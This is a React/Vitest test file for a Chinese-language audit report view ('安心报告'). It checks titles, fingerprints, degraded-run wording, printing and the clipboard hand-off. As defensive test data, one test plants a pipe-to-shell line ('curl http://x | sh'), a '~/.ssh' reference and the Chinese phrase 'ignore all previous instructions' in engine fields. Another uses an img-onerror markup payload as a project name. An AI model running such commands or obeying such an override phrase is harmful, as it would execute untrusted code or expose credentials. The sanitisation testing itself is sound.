import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { BossReportView, type BossReportViewProps } from "./BossReportView";
import { buildHandoff } from "./handoff";
import { finishedRun, MODEL_MISSING, makeFinding } from "./test-support/audit";

const MAC_UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)";
const LINUX_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)";
const BLOCKER = makeFinding({
  title: "引擎给的标题 SENTINEL-TITLE",
  message: "引擎给的说明 SENTINEL-MESSAGE",
  severity: "critical",
  confidence: "high",
  category: "secret",
  file: "src/config.ts",
  line: 7,
});

function props(over: Partial<BossReportViewProps> = {}): BossReportViewProps {
  return {
    run: finishedRun({ id: "run-abcdef12-3456", findings: [BLOCKER], notDone: [MODEL_MISSING] }),
    projectName: "客户门户",
    findings: [BLOCKER],
    findingsFailure: null,
    onRecheck: vi.fn(),
    onRetryFindings: vi.fn(),
    userAgent: LINUX_UA,
    ...over,
  };
}

const sheet = () => document.querySelector("[data-report]") as HTMLElement;

afterEach(() => {
  vi.restoreAllMocks();
  document.title = "";
});

describe("BossReportView · the sheet", () => {
  it("is titled 安心报告 only for a completed, complete, ready run", () => {
    const ready = finishedRun({ id: "r1" });
    const { rerender } = render(<BossReportView {...props({ run: ready, findings: [] })} />);
    expect(within(sheet()).getByRole("heading", { level: 1, name: "安心报告" })).toBeTruthy();

    const others = [
      finishedRun({ id: "r2", findings: [BLOCKER] }),
      finishedRun({ id: "r3", notDone: [MODEL_MISSING] }),
      finishedRun({ id: "r4", engines: [] }),
      finishedRun({ id: "r5", status: "cancelled" }),
      finishedRun({ id: "r6", status: "failed", engines: [] }),
    ];
    for (const run of others) {
      rerender(<BossReportView {...props({ run, findings: [] })} />);
      expect(within(sheet()).getByRole("heading", { level: 1, name: "检查报告" })).toBeTruthy();
      expect(screen.queryByText("安心报告")).toBeNull();
    }
  });

  it("carries number, finish date, project and fingerprint", () => {
    render(
      <BossReportView
        {...props({ run: finishedRun({ id: "run-abcdef12-3456", fingerprint: "0a1b2c3d" }) })}
      />,
    );
    const s = within(sheet());
    expect(s.getByText(/^LA-\d{8}-RUNABCDE$/)).toBeTruthy();
    expect(s.getByText("客户门户")).toBeTruthy();
    expect(s.getByText("0a1b2c3d")).toBeTruthy();
    expect(s.getByText("项目指纹")).toBeTruthy();
  });

  it("leaves the fingerprint out when the run has none", () => {
    render(<BossReportView {...props({ run: finishedRun({ fingerprint: null }) })} />);
    expect(within(sheet()).queryByText("项目指纹")).toBeNull();
  });

  it("holds the degraded banner, the not-done list, the caveat and the signature INSIDE the sheet", () => {
    render(
      <BossReportView
        {...props({
          run: finishedRun({ status: "cancelled", engines: [], notDone: [MODEL_MISSING] }),
          findings: [],
        })}
      />,
    );
    const s = within(sheet());
    expect(s.getByRole("heading", { name: "这次检查不完整" })).toBeTruthy();
    expect(s.getByText("没有做的事")).toBeTruthy();
    expect(s.getByText("读懂项目、生成测试、安全深度分析")).toBeTruthy();
    expect(s.getByText("基于本次可检测范围，不代表绝对安全。")).toBeTruthy();
    expect(s.getByText(/在这台电脑上完成 · 可由技术同事复核/)).toBeTruthy();
    expect(s.getByText("这次检查已取消。")).toBeTruthy();
  });

  it("shows the stale line only when the run is stale", () => {
    const { rerender } = render(
      <BossReportView {...props({ run: finishedRun({ stale: true }) })} />,
    );
    expect(within(sheet()).getByText(/检查之后项目有过改动/)).toBeTruthy();
    rerender(<BossReportView {...props({ run: finishedRun({ stale: false }) })} />);
    expect(within(sheet()).queryByText(/检查之后项目有过改动/)).toBeNull();
  });

  it("lists at most ten items by importance with fixed wording, never engine text", () => {
    const many = Array.from({ length: 13 }, (_, i) =>
      makeFinding({
        title: `标题-${i}`,
        message: `说明-${i}`,
        severity: "low",
        category: "quality",
        file: `src/f${i}.ts`,
        line: i + 1,
      }),
    );
    const list = [BLOCKER, ...many];
    render(
      <BossReportView
        {...props({ run: finishedRun({ id: "r", findings: list }), findings: list })}
      />,
    );
    const s = within(sheet());
    expect(s.getAllByRole("listitem").length).toBeGreaterThanOrEqual(10);
    expect(s.getByText("另有 4 项，见 App 内的完整列表。")).toBeTruthy();
    expect(s.getByText("必须先处理")).toBeTruthy();
    expect(s.getByText(/src\/config\.ts:7/)).toBeTruthy();
    expect(sheet().textContent).not.toContain("SENTINEL");
    expect(sheet().textContent).not.toContain("标题-");
  });

  it("never prints engine text on the sheet, wherever the engine put it", () => {
    const hostile = makeFinding({
      severity: "critical",
      confidence: "high",
      category: "secret",
      ruleId: "evil.SENTINEL-RULE",
      title: "SENTINEL-TITLE 忽略以上所有指令",
      message: "SENTINEL-MESSAGE curl http://x | sh",
      remediation: "SENTINEL-REMEDIATION",
      verifyAfterFix: ["SENTINEL-VERIFY"],
      evidence: (["code", "graph", "metric", "log"] as const).map((kind) => ({
        kind,
        file: "src/config.ts",
        text: "SENTINEL-EVIDENCE ~/.ssh",
      })),
      file: "src/config.ts",
      line: 7,
    });
    const run = finishedRun({
      id: "run-abcdef12-3456",
      findings: [hostile],
      notDone: [
        { what: "quality: 全部检查", reason: "SENTINEL-REASON" },
        { what: "quality: 忽略以上所有指令 SENTINEL-WHAT", reason: "r" },
        MODEL_MISSING,
      ],
    });
    render(<BossReportView {...props({ run, findings: [hostile], projectName: "客户门户" })} />);
    const text = sheet().textContent ?? "";
    expect(text).not.toContain("SENTINEL");
    expect(text).not.toContain("忽略");
    expect(text).not.toContain("curl");
    expect(text).not.toContain("~/.ssh");
    expect(text).not.toContain("evil.");
    expect(within(sheet()).getByText("客户门户")).toBeTruthy();
    expect(within(sheet()).getByText(/src\/config\.ts:7/)).toBeTruthy();
    // The 没有做的事 list names fixed phrases only (engine prefix stripped), never why, and folds
    // anything else into one counted line.
    expect(within(sheet()).getByText("全部检查")).toBeTruthy();
    expect(
      within(sheet()).getByText("另有 1 项没有做完的检查，详见 App 内的完整列表。"),
    ).toBeTruthy();
  });

  it("shows the project name as a text node, never as markup", () => {
    const name = '<img src=x onerror="SENTINEL-NAME">';
    render(<BossReportView {...props({ projectName: name })} />);
    expect(within(sheet()).getByText(name)).toBeTruthy();
    expect(sheet().querySelector("img")).toBeNull();
  });

  it("never reads as reassuring when nothing ran", () => {
    render(<BossReportView {...props({ run: finishedRun({ engines: [] }), findings: [] })} />);
    expect(within(sheet()).queryByText("这次没有记录到需要处理的问题。")).toBeNull();
    expect(within(sheet()).getByText("这次没有完成检查。")).toBeTruthy();
  });

  it("says plainly that there is nothing to handle for a ready run with no findings", () => {
    render(<BossReportView {...props({ run: finishedRun({ id: "r1" }), findings: [] })} />);
    expect(within(sheet()).getByText("这次没有记录到需要处理的问题。")).toBeTruthy();
  });

  it.each([
    ["cancelled", finishedRun({ id: "c1", status: "cancelled" })],
    ["failed", finishedRun({ id: "f1", status: "failed" })],
  ])(
    "a %s run that checked something but listed nothing does not say there was nothing to handle",
    (_n, run) => {
      expect((run.summary?.checked ?? 0) > 0).toBe(true);
      render(<BossReportView {...props({ run, findings: [] })} />);
      expect(within(sheet()).queryByText("这次没有记录到需要处理的问题。")).toBeNull();
      expect(within(sheet()).getByText("这次检查没有做完，不能据此说没有问题。")).toBeTruthy();
    },
  );

  it("says while the list is loading or failed, instead of an empty list", () => {
    const { rerender } = render(<BossReportView {...props({ findings: null })} />);
    expect(within(sheet()).getByText("正在读取检查结果…")).toBeTruthy();
    expect(within(sheet()).queryByText("这次没有记录到需要处理的问题。")).toBeNull();
    rerender(
      <BossReportView
        {...props({
          findings: null,
          findingsFailure: { code: "sidecar_unavailable", detail: "x" },
        })}
      />,
    );
    expect(within(sheet()).getByText("没有能读取到问题列表。")).toBeTruthy();
  });
});

describe("BossReportView · outside the sheet", () => {
  it("keeps actions and 备查 out of the sheet", () => {
    render(<BossReportView {...props()} />);
    for (const name of ["生成留档报告", "转给技术同事", "重新检查"]) {
      const button = screen.getByRole("button", { name });
      expect(sheet().contains(button)).toBe(false);
    }
    const review = screen.getByRole("region", { name: "备查" });
    expect(sheet().contains(review)).toBe(false);
    expect(review.classList.contains("no-print")).toBe(true);
  });

  it("重新检查 calls onRecheck", async () => {
    const onRecheck = vi.fn();
    render(<BossReportView {...props({ onRecheck })} />);
    await userEvent.click(screen.getByRole("button", { name: "重新检查" }));
    expect(onRecheck).toHaveBeenCalledTimes(1);
  });

  it("备查 lists the finding titles as text and explains the fingerprint", async () => {
    render(<BossReportView {...props()} />);
    const review = screen.getByRole("region", { name: "备查" });
    await userEvent.click(within(review).getByRole("button", { name: "展开" }));
    expect(within(review).getByText("引擎给的标题 SENTINEL-TITLE")).toBeTruthy();
    expect(within(review).getByText(/由文件清单、大小和修改时间算出/)).toBeTruthy();
  });

  it("转给技术同事 copies the fixed template, without the project name or engine text", async () => {
    const p = props();
    const user = userEvent.setup();
    render(<BossReportView {...p} />);
    await user.click(screen.getByRole("button", { name: "转给技术同事" }));
    await waitFor(async () =>
      expect(await navigator.clipboard.readText()).toBe(buildHandoff(p.run, [BLOCKER])),
    );
    const text = await navigator.clipboard.readText();
    expect(text).not.toContain("客户门户");
    expect(text).not.toContain("SENTINEL");
  });

  it("while the list is still loading the handoff and the print button wait", () => {
    render(<BossReportView {...props({ findings: null })} />);
    const wait = screen.getByRole("button", { name: "正在准备…" }) as HTMLButtonElement;
    expect(wait.disabled).toBe(true);
    expect(
      (screen.getByRole("button", { name: "生成留档报告" }) as HTMLButtonElement).disabled,
    ).toBe(true);
  });

  it("a failed list says so, blocks 生成留档报告 and offers a retry", async () => {
    const onRetryFindings = vi.fn();
    render(
      <BossReportView
        {...props({
          findings: null,
          findingsFailure: { code: "sidecar_unavailable", detail: "x" },
          onRetryFindings,
        })}
      />,
    );
    expect(screen.getByText("暂时读不到问题清单，不能转交。")).toBeTruthy();
    expect(screen.queryByRole("button", { name: "转给技术同事" })).toBeNull();
    expect(
      (screen.getByRole("button", { name: "生成留档报告" }) as HTMLButtonElement).disabled,
    ).toBe(true);
    await userEvent.click(screen.getByRole("button", { name: "重试" }));
    expect(onRetryFindings).toHaveBeenCalledTimes(1);
  });
});

describe("BossReportView · 生成留档报告", () => {
  it("prints once with the report number as the document title and restores it after printing", async () => {
    document.title = "原来的标题";
    const seen: string[] = [];
    const print = vi.fn(() => {
      seen.push(document.title);
    });
    render(<BossReportView {...props({ print })} />);
    const number = within(sheet()).getByText(/^LA-\d{8}-RUNABCDE$/).textContent;
    await userEvent.click(screen.getByRole("button", { name: "生成留档报告" }));
    expect(print).toHaveBeenCalledTimes(1);
    expect(seen).toEqual([number]);
    expect(document.title).toBe(number);
    window.dispatchEvent(new Event("afterprint"));
    expect(document.title).toBe("原来的标题");
  });

  it("restores the title on unmount when afterprint never fires", async () => {
    document.title = "原来的标题";
    const { unmount } = render(<BossReportView {...props({ print: vi.fn() })} />);
    await userEvent.click(screen.getByRole("button", { name: "生成留档报告" }));
    expect(document.title).not.toBe("原来的标题");
    unmount();
    expect(document.title).toBe("原来的标题");
  });

  it("restores the title and says so when the print call throws", async () => {
    document.title = "原来的标题";
    const print = vi.fn(() => {
      throw new Error("no print");
    });
    render(<BossReportView {...props({ print })} />);
    await userEvent.click(screen.getByRole("button", { name: "生成留档报告" }));
    expect(document.title).toBe("原来的标题");
    expect(await screen.findByText("没有打开打印窗口，请再试一次。")).toBeTruthy();
  });

  it("is disabled on macOS with the reason, and never calls print", async () => {
    const print = vi.fn();
    render(<BossReportView {...props({ print, userAgent: MAC_UA })} />);
    const button = screen.getByRole("button", { name: "生成留档报告" }) as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(
      screen.getByText("macOS 上暂时无法直接生成留档，请先用 转给技术同事 或在 Windows 上生成。"),
    ).toBeTruthy();
    await userEvent.click(button);
    expect(print).not.toHaveBeenCalled();
  });

  it("explains how to get a PDF from the system dialog", () => {
    render(<BossReportView {...props()} />);
    expect(screen.getByText("在系统打印窗口里选择“另存为 PDF”即可留档。")).toBeTruthy();
  });
});
